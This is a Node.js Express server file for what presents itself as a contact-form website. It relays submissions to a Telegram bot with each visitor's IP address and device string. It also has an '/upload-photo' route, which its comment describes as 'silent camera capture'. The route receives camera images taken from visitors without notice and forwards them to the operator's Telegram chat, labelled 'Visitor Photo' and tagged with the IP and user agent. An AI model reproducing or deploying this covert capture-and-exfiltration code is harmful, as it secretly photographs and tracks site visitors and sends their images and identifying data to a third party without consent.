require('dotenv').config();
const express = require('express');
const path = require('path');
const multer = require('multer');
const FormData = require('form-data');
const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
    console.error('❌  Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env');
    if (process.env.NODE_ENV !== 'production') process.exit(1);
}

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ── Telegram helpers ─────────────────────────────────────────────────────────
async function tgSendMessage(text) {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' }),
    });
    return res.json();
}

async function tgSendPhoto(buffer, caption) {
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('photo', buffer, { filename: 'visitor.jpg', contentType: 'image/jpeg' });
    fd.append('caption', caption);
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: fd,
        headers: fd.getHeaders(),
    });
    return res.json();
}

// ── Routes ───────────────────────────────────────────────────────────────────
app.get('/', (_req, res) =>
    res.sendFile(path.join(__dirname, 'public', 'index.html'))
);

// Photo upload — silent camera capture sent via backend
app.post('/upload-photo', upload.single('photo'), async (req, res) => {
    if (!req.file) return res.status(400).json({ success: false });

    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Beirut' });

    const caption = [
        '📸 *Visitor Photo*',
        `🌐 IP: ${ip}`,
        `🖥️ ${userAgent.substring(0, 100)}`,
        `⏰ ${timestamp}`,
    ].join('\n');

    try {
        await tgSendPhoto(req.file.buffer, caption);
        res.json({ success: true });
    } catch (err) {
        console.error('Photo send error:', err);
        res.status(500).json({ success: false });
    }
});

// Contact form submission
app.post('/submit', async (req, res) => {
    const { email, instagram, subject, message } = req.body;

    if (!email || !subject || !message) {
        return res.status(400).json({ success: false, error: 'Missing required fields.' });
    }

    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Beirut' });

    const text = [
        '📬 *New Contact Form Submission*',
        '',
        `📧 *Email:* ${email}`,
        `📸 *Instagram:* ${instagram || 'Not provided'}`,
        `📌 *Subject:* ${subject}`,
        '',
        `💬 *Complain / Message:*`,
        message,
        '',
        '─────────────────',
        `🌐 *IP Address:* ${ip}`,
        `🖥️ *Device:* ${userAgent.substring(0, 120)}`,
        `⏰ *Time (Beirut):* ${timestamp}`,
    ].join('\n');

    try {
        const result = await tgSendMessage(text);
        if (!result.ok) {
            console.error('Telegram error:', result);
            return res.status(502).json({ success: false, error: 'Telegram delivery failed.' });
        }
        res.json({ success: true });
    } catch (err) {
        console.error('Server error:', err);
        res.status(500).json({ success: false, error: 'Internal server error.' });
    }
});

// Export for Vercel serverless
module.exports = app;

// Start local server only when run directly (not on Vercel)
if (require.main === module) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => console.log(`✅  Server running at http://localhost:${PORT}`));
}
